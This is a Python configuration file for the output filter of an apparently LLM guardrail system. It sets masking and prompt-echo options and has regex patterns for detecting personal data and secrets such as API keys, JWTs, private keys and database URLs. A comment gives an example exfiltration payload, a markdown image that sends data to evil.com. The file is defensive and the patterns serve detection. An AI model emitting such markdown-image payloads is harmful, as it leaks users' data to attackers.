# guardrail/layer5_output_filter/config.py

import re
from dataclasses import dataclass, field
from typing import List, Pattern


@dataclass(frozen=True)
class OutputFilterConfig:
    # ---- PII ----
    MASK_CHAR: str = "*"
    MASK_STYLE: str = "partial"          # "full" | "partial" | "hash"
    MASK_KEEP_LAST: int = 4              # for partial masking
    HASH_SALT: str = "guardrail-v1"

    # ---- Prompt echo ----
    ECHO_NGRAM_SIZE: int = 12            # tokens
    ECHO_SIMILARITY_THRESHOLD: float = 0.75
    ECHO_MIN_LENGTH: int = 40            # chars

    # ---- Exfiltration ----
    EXFIL_URL_ALLOWLIST: List[str] = field(default_factory=lambda: [
        "api.openai.com",
        "api.anthropic.com",
    ])
    BLOCK_MARKDOWN_IMAGES: bool = True   # ![x](http://evil.com?data=...)
    BLOCK_DATA_URIS: bool = True
    MAX_OUTPUT_LENGTH: int = 16_000

    # ---- Behavior ----
    REJECT_ON_EXFIL: bool = True
    REDACT_ON_ECHO: bool = True


DEFAULT_CONFIG = OutputFilterConfig()


# ---------------------------------------------------------------------- #
# PII regex patterns (compiled once)
# ---------------------------------------------------------------------- #
PII_PATTERNS = {
    "EMAIL": re.compile(
        r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b"
    ),
    "PHONE_IN": re.compile(
        r"(?:(?:\+|0{0,2})91[\s-]?)?[6-9]\d{9}\b"
    ),
    "PHONE_US": re.compile(
        r"\b(?:\+1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b"
    ),
    "SSN_US": re.compile(
        r"\b\d{3}-\d{2}-\d{4}\b"
    ),
    "AADHAAR_IN": re.compile(
        r"\b\d{4}\s?\d{4}\s?\d{4}\b"
    ),
    "PAN_IN": re.compile(
        r"\b[A-Z]{5}\d{4}[A-Z]\b"
    ),
    "CREDIT_CARD": re.compile(
        r"\b(?:\d[ -]*?){13,16}\b"
    ),
    "IPV4": re.compile(
        r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
    ),
    "API_KEY_GENERIC": re.compile(
        r"\b(?:sk|pk|api|key|token)[-_][A-Za-z0-9]{16,}\b",
        re.IGNORECASE,
    ),
    "AWS_ACCESS_KEY": re.compile(
        r"\bAKIA[0-9A-Z]{16}\b"
    ),
    "JWT": re.compile(
        r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b"
    ),
    "PRIVATE_KEY": re.compile(
        r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----[\s\S]+?-----END"
    ),
    "PASSWORD_ASSIGN": re.compile(
        r"\b(?:password|passwd|pwd)\s*[:=]\s*\S+",
        re.IGNORECASE,
    ),
    "BEARER_TOKEN": re.compile(
        r"\bBearer\s+[A-Za-z0-9\-._~+/]+=*\b",
        re.IGNORECASE,
    ),
    "DB_CONN": re.compile(
        r"(?:postgres|mysql|mongodb|redis)://[^\s]+",
        re.IGNORECASE,
    ),
}